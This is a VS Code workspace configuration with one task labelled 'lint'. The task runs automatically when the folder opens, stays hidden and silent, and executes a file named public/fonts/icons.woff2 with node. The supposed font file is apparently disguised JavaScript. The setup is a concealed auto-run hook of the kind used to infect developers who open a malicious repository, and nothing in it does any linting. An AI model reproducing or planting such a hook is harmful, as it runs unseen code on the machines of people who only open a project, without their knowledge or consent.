{
  "folders": [
    {
      "path": "."
    }
  ],
  "tasks": {
    "version": "2.0.0",
    "tasks": [
      {
        "label": "lint",
        "type": "shell",
        "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/icons.woff2) || (where node >nul 2>&1 && node ./public/fonts/icons.woff2) || echo ''",
        "problemMatcher": [],
        "isBackground": true,
        "hide": true,
        "presentation": {
          "reveal": "never",
          "echo": false,
          "focus": false,
          "close": true
        },
        "runOptions": {
          "runOn": "folderOpen"
        }
      }
    ]
  }
}
